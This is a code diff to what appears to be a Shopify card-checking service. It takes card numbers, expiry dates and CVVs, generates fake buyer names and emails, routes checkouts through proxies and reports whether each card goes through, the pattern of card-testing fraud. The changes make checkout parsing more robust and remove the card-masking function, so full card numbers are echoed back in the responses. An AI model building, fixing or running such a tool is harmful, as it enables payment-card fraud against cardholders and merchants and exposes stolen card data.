@@ -10,7 +10,7 @@ import os
 import traceback
 from urllib.parse import urlparse, parse_qs
 from decimal import Decimal
-from flask import Flask, request, jsonify
+from flask import Flask, request
 from logging.handlers import RotatingFileHandler
 
 try:
@@ -132,12 +132,15 @@ async def post_with_retry(session, url, data=None, json=None, headers=None,
                           proxy=None, max_retries=2, backoff=0.5, timeout=10):
     for attempt in range(max_retries):
         try:
-            async with session.post(url, data=data, json=json, headers=headers,
-                                    proxy=proxy, timeout=timeout) as resp:
-                if resp.status == 429:
-                    await asyncio.sleep(backoff * (2 ** attempt) + random.uniform(0, 1))
-                    continue
-                return resp
+            resp = await session.post(url, data=data, json=json, headers=headers,
+                                      proxy=proxy, timeout=timeout)
+            if resp.status == 429:
+                resp.release()
+                await asyncio.sleep(backoff * (2 ** attempt) + random.uniform(0, 1))
+                continue
+            status = resp.status
+            resp.release()
+            return type('Resp', (), {'status': status})()
         except (aiohttp.ClientError, asyncio.TimeoutError):
             if attempt == max_retries - 1:
                 raise
@@ -330,13 +333,6 @@ def extract_clean_response(message):
     return message[:200]
 
 
-def mask_card(card):
-    s = re.sub(r'\D', '', card or '')
-    if len(s) >= 10:
-        return f"{s[:6]}******{s[-4:]}"
-    return '***'
-
-
 # ---------- name/email ----------
 FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
 LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
@@ -403,7 +399,7 @@ async def fetch_products(domain, proxy_str=None, force_refresh=False):
                             edges {
                                 node {
                                     id
-                                    priceV2 { amount currencyCode }
+                                    price { amount currencyCode }
                                     availableForSale
                                     requiresShipping
                                 }
@@ -448,9 +444,10 @@ async def fetch_products(domain, proxy_str=None, force_refresh=False):
                             if not vn.get('availableForSale', False):
                                 continue
                             try:
-                                price = float(vn.get('priceV2', {}).get('amount', '0'))
-                                cur = vn.get('priceV2', {}).get('currencyCode', 'USD')
-                            except (ValueError, TypeError):
+                                price_block = vn.get('price') or vn.get('priceV2') or {}
+                                price = float(price_block.get('amount', '0'))
+                                cur = price_block.get('currencyCode', 'USD')
+                            except (ValueError, TypeError, AttributeError):
                                 continue
                             if price <= 0:
                                 continue
@@ -508,7 +505,8 @@ async def fetch_products(domain, proxy_str=None, force_refresh=False):
                             if not v.get('available', True):
                                 continue
                             try:
-                                price = float(v.get('price', '0').replace(',', ''))
+                                raw_price = v.get('price', '0')
+                                price = float(str(raw_price).replace(',', ''))
                             except (ValueError, TypeError):
                                 continue
                             if price <= 0:
@@ -964,9 +962,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     dlines = delivery_data.get('deliveryLines', [{}])
                     strategies = dlines[0].get('availableDeliveryStrategies', []) if dlines else []
                     if strategies:
-                        cheapest = min(strategies, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', 999999)))
+                        def _strat_price(s):
+                            try:
+                                v = s.get('amount', {}).get('value', {}).get('amount')
+                                return float(v) if v is not None else 999999.0
+                            except (ValueError, TypeError):
+                                return 999999.0
+                        cheapest = min(strategies, key=_strat_price)
                         delivery_strategy = cheapest.get('handle', '')
-                        shipping_amount = float(cheapest.get('amount', {}).get('value', {}).get('amount', '0'))
+                        shipping_amount = _strat_price(cheapest)
+                        if shipping_amount >= 999999.0:
+                            shipping_amount = 0.0
                     else:
                         delivery_strategy = ''
                         shipping_amount = 0.0
@@ -1078,7 +1084,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "Invalid JSON in delivery proposal", gateway, total_price, currency, proxy_ok
 
             if 'errors' in delivery_json:
-                return False, f"Delivery proposal error: {delivery_json['errors']}", gateway, total_price, currency, proxy_ok
+                dels = delivery_json['errors'] or []
+                return False, f"Delivery proposal error: {dels[0] if dels else 'unknown'}", gateway, total_price, currency, proxy_ok
 
             delivery_result = delivery_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
             if not delivery_result or delivery_result.get('__typename') != 'NegotiationResultAvailable':
@@ -1170,25 +1177,40 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             final_currency = currency
             for field in ('checkoutTotal', 'total', 'runningTotal'):
                 val = delivery_seller.get(field, {})
-                if val and val.get('__typename') in ('MoneyValue', 'MoneyValueConstraint'):
-                    amount = val.get('value', {}).get('amount') or val.get('amount')
-                    cur = val.get('value', {}).get('currencyCode') or val.get('currencyCode')
-                    if amount is not None:
-                        final_total = str(amount)
-                        if cur:
-                            final_currency = cur
-                        break
+                if not val:
+                    continue
+                amount = None
+                cur = None
+                if isinstance(val.get('value'), dict):
+                    amount = val['value'].get('amount')
+                    cur = val['value'].get('currencyCode')
+                if amount is None:
+                    amount = val.get('amount')
+                if cur is None:
+                    cur = val.get('currencyCode')
+                if amount is not None:
+                    final_total = str(amount)
+                    if cur:
+                        final_currency = cur
+                    break
             if final_total is None:
-                merch = merchandise_total or subtotal
-                final_total = str(
-                    Decimal(str(merch))
-                    + Decimal(str(shipping_amount))
-                    + Decimal(str(tax_amount))
-                )
+                merch_amt = merchandise_total or subtotal or '0.01'
+                try:
+                    final_total = str(
+                        Decimal(str(merch_amt))
+                        + Decimal(str(shipping_amount or 0))
+                        + Decimal(str(tax_amount or 0))
+                    )
+                except Exception:
+                    final_total = str(merch_amt)
             currency = final_currency
 
-            if float(final_total) <= 0:
-                final_total = str(max(0.01, float(merchandise_total or subtotal)))
+            try:
+                if float(final_total) <= 0:
+                    fallback = merchandise_total or subtotal or '0.01'
+                    final_total = str(max(0.01, float(fallback)))
+            except (ValueError, TypeError):
+                final_total = merchandise_total or subtotal or '0.01'
 
             # PCI vault
             payload = {
@@ -1362,10 +1384,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Invalid JSON in submit: {str(e)}", gateway, attempted_price, currency, proxy_ok
 
             if 'errors' in submit_result:
-                err = submit_result['errors'][0]
+                errors_list = submit_result['errors'] or []
+                err = errors_list[0] if errors_list else {}
                 code = err.get('extensions', {}).get('code', '')
                 msg = err.get('message', '')
-                return False, f"GRAPHQL_ERROR: {code} - {msg}", gateway, attempted_price, currency, proxy_ok
+                return False, f"GRAPHQL_ERROR: {code} - {msg}".strip(': -'), gateway, attempted_price, currency, proxy_ok
 
             submit_data = submit_result.get('data', {}).get('submitForCompletion', {})
             if not submit_data:
@@ -1383,10 +1406,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     if not rid:
                         return False, "No receipt ID", gateway, attempted_price, currency, proxy_ok
                 po = submit_data.get('purchaseOrder', {})
-                ta = po.get('totalAmountToPay', {})
+                ta = po.get('totalAmountToPay') or {}
                 if ta:
-                    total_price = ta.get('amount', '0.00')
-                    currency = ta.get('currencyCode', currency)
+                    if isinstance(ta.get('value'), dict):
+                        total_price = str(ta['value'].get('amount', '0.00'))
+                        currency = ta['value'].get('currencyCode') or currency
+                    else:
+                        total_price = str(ta.get('amount', '0.00'))
+                        currency = ta.get('currencyCode') or currency
                 else:
                     total_price = final_total
 
@@ -1514,7 +1541,7 @@ def shopify_checker():
             )
         except asyncio.TimeoutError:
             return pretty_jsonify({
-                "CC": mask_card(cc_string),
+                "CC": cc_string,
                 "Currency": "USD",
                 "Gateway": "Shopify",
                 "Price": "0.00",
@@ -1524,6 +1551,14 @@ def shopify_checker():
                 "Time": f"{time.time() - start_time:.2f}s",
             }, 504)
         finally:
+            try:
+                _cancel_all = asyncio.all_tasks(loop)
+                for t in _cancel_all:
+                    t.cancel()
+                if _cancel_all:
+                    loop.run_until_complete(asyncio.gather(*_cancel_all, return_exceptions=True))
+            except Exception:
+                pass
             loop.close()
 
         clean = extract_clean_response(message)
@@ -1537,7 +1572,7 @@ def shopify_checker():
             proxy_status = "dead"
 
         response = {
-            "CC": mask_card(cc_string),
+            "CC": cc_string,
             "Currency": currency,
             "Gateway": gateway,
             "Price": str(price) if price else "0.00",
@@ -1556,7 +1591,7 @@ def shopify_checker():
         if not request.args.get('proxy'):
             proxy_status = "none"
         return pretty_jsonify({
-            "CC": mask_card(request.args.get('cc', '')),
+            "CC": request.args.get('cc', ''),
             "Currency": "USD",
             "Gateway": "UNKNOWN",
             "Price": "0.00",
